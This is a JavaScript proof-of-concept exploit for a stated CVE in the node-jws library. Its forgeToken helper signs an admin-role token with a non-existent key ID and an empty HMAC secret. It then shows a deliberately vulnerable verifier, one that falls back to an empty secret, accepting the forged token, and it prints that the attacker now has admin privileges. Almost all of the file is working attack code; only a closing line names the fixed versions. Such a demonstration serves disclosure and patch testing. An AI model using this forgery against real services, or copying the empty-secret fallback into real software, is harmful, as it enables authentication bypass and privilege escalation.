/**
 * CVE-2025-65945 Proof of Concept
 * Improper Verification of Cryptographic Signature in node-jws
 *
 * Affected versions: jws <= 3.2.2 and 4.0.0
 * Fixed in: jws 3.2.3 and 4.0.1
 */

const jws = require("jws");
const crypto = require("crypto");

console.log("=".repeat(60));
console.log("CVE-2025-65945: node-jws HMAC Signature Bypass");
console.log("=".repeat(60));

// Simulated application secret store
const secretStore = {
  "api-key-1": "production-secret-abc123",
  "api-key-2": "production-secret-xyz789",
};

function lookupSecret(keyId) {
  return secretStore[keyId]; // Returns undefined if not found
}

// Helper to forge tokens with arbitrary secret
function forgeToken(payload, keyId, secret) {
  const base64url = (data) => {
    const str = typeof data === "string" ? data : JSON.stringify(data);
    return Buffer.from(str)
      .toString("base64")
      .replace(/\+/g, "-")
      .replace(/\//g, "_")
      .replace(/=/g, "");
  };

  const header = { alg: "HS256", kid: keyId };
  const encodedHeader = base64url(header);
  const encodedPayload = base64url(payload);
  const signingInput = `${encodedHeader}.${encodedPayload}`;

  const signature = crypto
    .createHmac("sha256", secret)
    .update(signingInput)
    .digest("base64")
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=/g, "");

  return `${signingInput}.${signature}`;
}

// Vulnerable server-side verification function
// This pattern is commonly used when applications support multiple API keys
function vulnerableVerifyToken(token) {
  return new Promise((resolve, reject) => {
    const decoded = jws.decode(token);
    if (!decoded) {
      return reject(new Error("Invalid token format"));
    }

    const keyId = decoded.header.kid;
    const secret = lookupSecret(keyId);

    // VULNERABLE: Using createVerify with user-influenced secret
    // When keyId is not found, secret is undefined
    const verifier = jws.createVerify({
      algorithm: "HS256",
      signature: token,
    });

    verifier.on("done", (valid, obj) => {
      resolve({ valid, decoded: obj });
    });

    verifier.on("error", (err) => {
      reject(err);
    });

    // Application writes the looked-up secret to the stream
    // BUG: If secret is undefined, this becomes empty string ''
    verifier.secret.write(secret || "");
    verifier.secret.end();
  });
}

async function runExploit() {
  // Step 1: Create a legitimate token (how a real user would get one)
  console.log("\n[1] Legitimate Token Creation");
  console.log("-".repeat(40));
  const legitimateToken = jws.sign({
    header: { alg: "HS256", kid: "api-key-1" },
    payload: JSON.stringify({ userId: "user123", role: "user" }),
    secret: secretStore["api-key-1"],
  });
  console.log("Token:", legitimateToken.substring(0, 50) + "...");

  // Step 2: Attacker forges a token with elevated privileges
  console.log("\n[2] Attacker Forges Malicious Token");
  console.log("-".repeat(40));
  const maliciousPayload = {
    userId: "attacker",
    role: "admin",
    permissions: ["read", "write", "delete", "admin"],
  };

  // Attacker uses a non-existent key ID and signs with empty secret
  const forgedToken = forgeToken(maliciousPayload, "non-existent-key", "");
  console.log("Forged token:", forgedToken.substring(0, 50) + "...");
  console.log("Payload claims:", maliciousPayload);

  // Step 3: Test legitimate token
  console.log("\n[3] Server Verifies Legitimate Token");
  console.log("-".repeat(40));
  try {
    const legitResult = await vulnerableVerifyToken(legitimateToken);
    console.log("Valid:", legitResult.valid);
    console.log("User:", legitResult.decoded.payload);
  } catch (err) {
    console.log("Error:", err.message);
  }

  // Step 4: Test forged token - THE EXPLOIT
  console.log("\n[4] Server Verifies FORGED Token");
  console.log("-".repeat(40));
  try {
    const forgedResult = await vulnerableVerifyToken(forgedToken);
    console.log("Valid:", forgedResult.valid);
    console.log("Claimed identity:", forgedResult.decoded.payload);

    if (forgedResult.valid) {
      console.log("\n" + "!".repeat(60));
      console.log("EXPLOIT SUCCESSFUL!");
      console.log("Attacker bypassed signature verification!");
      console.log("Attacker now has admin privileges.");
      console.log("!".repeat(60));
    }
  } catch (err) {
    console.log("Error:", err.message);
  }

  // Step 5: Show the fix
  console.log("\n[5] Mitigation");
  console.log("-".repeat(40));
  console.log("Upgrade to jws >= 3.2.3 or >= 4.0.1");
  console.log("The fix validates that HMAC secrets are non-null/non-empty");
}

runExploit().catch(console.error);
